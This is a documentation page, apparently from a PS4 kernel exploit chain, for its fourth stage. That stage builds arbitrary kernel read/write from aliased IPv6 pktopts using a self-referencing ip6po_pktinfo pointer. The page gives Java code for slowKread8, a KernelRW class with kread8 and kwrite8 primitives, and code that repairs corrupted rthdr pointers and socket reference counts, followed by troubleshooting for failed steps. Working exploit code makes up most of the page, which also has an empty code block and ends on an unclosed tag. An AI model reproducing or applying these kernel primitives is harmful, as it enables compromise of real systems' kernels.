# Stage 4: Kernel Read/Write

Stage 4 is the culmination of the exploit chain, transforming the aliased pktopts from Stage 3 into arbitrary kernel read/write capabilities. This stage implements both slow and fast R/W primitives, locates critical kernel structures, and establishes the foundation for post-exploitation.

## Overview

```java

```

## Goals of Stage 4

1. **Overwrite main pktopts** - Gain controlled pointer manipulation
2. **Implement slowKread8** - Slow but reliable kernel read primitive
3. **Find curproc** - Locate current process structure
4. **Setup fast R/W** - Create optimized read/write via worker socket
5. **Fix corrupt pointers** - Repair kernel state to prevent crashes

### Creating Self-Referencing Pointer

The key trick: set `ip6po_pktinfo` to point to itself.

```
pktopts structure at k100Addr:
+0x00: ...
+0x10: ip6po_pktinfo = (k100Addr + 0x10)  ← Points to itself!
+0x18: ...
```

Why? When we later read/write IPV6_PKTINFO, the kernel will:
1. Dereference `ip6po_pktinfo` pointer
2. Read/write at that address
3. Since it points to itself, we can change where it points
4. This creates an **arbitrary read/write primitive**

### Reclaim Secondary Pktopts

From `Lapse.java:1165-1189`:

### How slowKread8 Works

```java
// Conceptual implementation (actual code in Kernel.java)
long slowKread8(int masterSock, Buffer pktinfo, int pktinfoLen, 
               Buffer readBuf, long addr) {
    // Step 1: Update ip6po_pktinfo to point to target address
    pktinfo.putLong(0, addr);
    Helper.setSockOpt(masterSock, Helper.IPPROTO_IPV6, Helper.IPV6_PKTINFO, 
                     pktinfo, pktinfoLen);
    
    // Step 2: Read from the address via IPV6_PKTINFO
    Helper.getSockOpt(masterSock, Helper.IPPROTO_IPV6, Helper.IPV6_PKTINFO, 
                     readBuf, 8);
    
    // Step 3: Return the 8-byte value
    return readBuf.getLong(0);
}
```

<Warning>
slowKread8 requires 2 syscalls per 8-byte read:
1. setsockopt() to set the target address
2. getsockopt() to read the value

This is too slow for bulk operations.
</Warning>

### KernelRW Class

The `Kernel.KernelRW` class provides fast read/write primitives:

```java
// Conceptual implementation
class KernelRW {
    int masterSock;   // Has pktopts with ip6po_pktinfo = (k100Addr + 0x10)
    int workerSock;   // Regular socket with known pktopts address
    long workerPktopts;
    long curprocOfiles;
    
    void setupPktinfo(long workerPktopts) {
        this.workerPktopts = workerPktopts;
    }
    
    long kread8(long addr) {
        // Step 1: Use masterSock to write addr to workerPktopts.ip6po_pktinfo
        kwrite8(workerPktopts + 0x10, addr);
        
        // Step 2: Use workerSock to read from addr via IPV6_PKTINFO
        Buffer buf = new Buffer(8);
        Helper.getSockOpt(workerSock, Helper.IPPROTO_IPV6, 
                         Helper.IPV6_PKTINFO, buf, 8);
        return buf.getLong(0);
    }
    
    void kwrite8(long addr, long value) {
        // Step 1: Update masterSock's ip6po_pktinfo to point to addr
        Buffer pktinfo = new Buffer(0x14);
        pktinfo.putLong(0, addr);
        pktinfo.putLong(8, value);  // Value to write
        Helper.setSockOpt(masterSock, Helper.IPPROTO_IPV6, 
                         Helper.IPV6_PKTINFO, pktinfo, 0x14);
    }
}
```

<Note>
**Fast R/W Strategy**:
- **masterSock** acts as a write primitive (can write to arbitrary addresses)
- **workerSock** acts as a read primitive (after masterSock sets its pktinfo pointer)
- Together they provide bidirectional arbitrary kernel R/W
</Note>

## Step 5: Fixing Corrupt Pointers

### Why Fixes Are Needed

Our exploitation corrupted several kernel structures:
- Routing headers that don't actually point to valid rthdrs
- Socket reference counts that are abnormal
- Pointers that would cause crashes if dereferenced

We must fix these before continuing.

From `Lapse.java:1275-1303`:

```java
Status.println("Applying fixes to corrupt pointers");

int offIp6poRthdr = KernelOffset.PS4_OFF_IP6PO_RTHDR;

// Fix rthdr pointers for all sockets
for (int i = 0; i < sds.length; i++) {
    if (sds[i] >= 0) {
        long sockPktopts = kernelRW.getSockPktopts(sds[i]);
        kernelRW.kwrite8(sockPktopts + offIp6poRthdr, 0);  // NULL out rthdr
    }
}

long reclaimerPktopts = kernelRW.getSockPktopts(reclaimSock);
kernelRW.kwrite8(reclaimerPktopts + offIp6poRthdr, 0);

long workerPktoptsAddr = kernelRW.getSockPktopts(workerSock);
kernelRW.kwrite8(workerPktoptsAddr + offIp6poRthdr, 0);

// Increase ref counts - only for sockets we actually have
int[] sockIncreaseRef = {masterSock, workerSock, reclaimSock};

for (int i = 0; i < sockIncreaseRef.length; i++) {
    long sockAddr = kernelRW.getFdDataAddr(sockIncreaseRef[i]);
    kernelRW.kwrite32(sockAddr + 0x0, 0x100);  // so_count = 256
}

Status.println("Fixes applied");
return true;
```

### Fixes Applied

1. **NULL out routing header pointers**: Prevents crashes if kernel tries to free these
2. **Increase socket reference counts**: Prevents premature deallocation

<Warning>
Without these fixes, closing sockets or process termination would likely cause kernel panics. Always apply fixes immediately after gaining kernel R/W.
</Warning>

## Common Failure Points

### Failed to Overwrite Main Pktopts

```
Failed to overwrite main pktopts
```

**Cause**: Routing header spray didn't reclaim pktopts memory  
**Solution**: Increase NUM_ALIAS, ensure sdsAlt has enough sockets

### Test Read of "evf cv" Failed

```
Test read of "evf cv" failed
```

**Cause**: slowKread8 not working, pointer manipulation failed  
**Solution**: Verify k100Addr is correct, check pktopts structure layout

### Invalid curproc Kernel Address

```
Invalid curproc kernel address: 0x0000....
```

**Cause**: aioInfoAddr was wrong or structure changed  
**Solution**: Verify Stage 2 leak, check firmware offsets

### Curproc Verification Failed

```
Curproc verification failed: 0xffff....
Current PID: 123
Found PID at curproc+0xb0: 456
```

**Cause**: PROC_PID offset wrong for this firmware  
**Solution**: Update KernelOffset.PROC_PID for your firmware version

## Performance Characteristics

### slowKread8
- **Speed**: ~2 syscalls per 8 bytes
- **Use case**: Initial setup, locating structures
- **Limitation**: Too slow for bulk operations

### Fast R/W (KernelRW)
- **Speed**: ~1 syscall per 8 bytes (read) or 1 syscall per 20 bytes (write with pktinfo)
- **Use case**: Post-exploitation operations
- **Limitation**: Requires initial setup via slowKread8

<Note>
